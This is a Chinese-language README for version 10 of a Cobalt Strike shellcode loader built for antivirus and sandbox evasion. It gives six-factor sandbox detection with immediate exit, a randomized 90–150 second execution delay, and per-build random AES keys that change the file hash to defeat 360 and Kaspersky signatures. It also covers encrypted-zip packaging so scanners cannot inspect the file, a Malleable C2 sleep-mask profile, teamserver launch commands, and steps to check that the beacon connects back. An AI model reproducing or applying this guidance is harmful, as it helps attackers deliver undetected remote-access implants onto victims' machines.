# Loader v10 — AES + 强化反沙箱 + 时间延迟（微步对抗 v2）

## 背景

微步云沙箱复测 v9：全部杀软通过，但微步云仍检出（CobaltStrike Yara 命中）。
原因：微步用**完整 Win10 镜像**（1903 + Office2016），v9 的三项环境检测
（鼠标/uptime/进程数）全不命中 → 反沙箱失效 → 沙箱运行了 loader →
内存中 beacon 明文被 Yara 命中。

## v10 双防线

```
双击 loader.exe
  │
  ├─ ① 反沙箱（6 维评分，≥3 项命中才判定沙箱）：
  │    鼠标4秒无移动 / 运行<15分钟 / 进程<40 / CPU<2核
  │    内存<2GB / 屏幕<800x600
  │    → 命中：立即退出，零行为
  │
  ├─ ② 时间延迟：随机 Sleep 90~150 秒
  │    → 逃逸沙箱动态分析窗口（沙箱只看到进程在睡觉）
  │
  └─ 通过 → AES 解密 → VirtualAlloc → 执行 → 上线
```

> 注意：beacon 启动后约 **2 分钟**才上线（延迟所致），属正常。
> 不检测 VM 硬件（CPUID/VMware/VBox）——避免误杀自建虚拟机。

## 打包（v2：自动随机密钥 + 加密 zip 输出）

```powershell
# beacon 放目录外（防实时防护隔离），-Beacon 引用：
powershell -ExecutionPolicy Bypass -File build.ps1 `
  -Gcc D:\tools\w64devkit\bin\gcc.exe `
  -Beacon D:\beacon_raw\new_beacon.bin
```

**每次构建自动完成**：
1. **随机 AES-256 密钥/IV**（无需手改脚本）→ 每次密文不同 → **loader SHA 全变** → 逃过 360/卡巴的签名与云信誉（实测：卡巴 v8/v9 杀、换新特征的 v10 活，样本入库驱动）
2. 内存中 Yara 字符串 patch + AES 加密（明文 beacon 不落盘）
3. 编译 loader.exe
4. **可选加密 zip**（默认输出 `loader_<时间戳>.zip`）——ZipCrypto 密码保护，**防 360 未解压直接杀**（360 扫不了加密内容）

参数：
```powershell
-ZipPwd "自定义密码"   # 指定 zip 密码（默认自动随机并打印）
-NoZip                 # 不生成加密 zip
```

> 部署注意：**每次部署必须重新 build**（换 key = 新特征），这是对抗 360/卡巴的核心手段。zip 密码记牢，解压后只分发 loader.exe。

## 治本增强（推荐）：启用 beacon sleep mask

loader 层的反沙箱/延迟是"拖延战术"，**beacon 内存明文仍是根本弱点**。
CS 4.8 启用 sleep mask（beacon sleep 时内存加密，醒来解密）：
1. 写一个 Malleable C2 profile（例如 `mask.profile`）：
   ```
   stage {
       set sleep_mask "true";
       set obfuscate "true";
       set userwx "false";
   }
   ```
2. 用 profile 重启团队服务器：
   ```
   ./teamserver 192.168.0.104 <密码> mask.profile
   ```
3. 重新生成 raw beacon → 用本目录 build.ps1 打包
   → beacon 大部分时间内存是密文，沙箱内存 Yara 无的放矢

## 验证

1. 双击 `loader.exe`（人在场）→ 等 ~2 分钟 → CS 上线 → `getuid`
2. 微步云沙箱复测 → 预期：引擎全过 + 微步云不再检出（或检出概率大降）
3. 若仍检出：启用 sleep mask（上节）后重测，并把报告发我

## 目录

| 文件 | 说明 |
|---|---|
| `loader.exe` | 成品 |
| `loader_v10.c` | 源码（6维反沙箱 + 90-150s 延迟 + AES/BCrypt） |
| `encrypt_aes.py` | AES 加密（KEY/IV 在此） |
| `payload_v8.h` | 密文载荷（自动生成） |
| `build.ps1` | 一键打包 |
| `README.md` | 本说明 |

## 版本脉络（工具库）

- `ai-av-evasion-optimized`（v8）：AES + BCrypt，火绒双通过；微步云检出（无防护）
- `ai-av-evasion-v9`（v9）：+ 3维反沙箱；被微步完整镜像绕过
- `ai-av-evasion-v10`（v10）：+ 6维反沙箱 + 90-150s 延迟 ← 当前
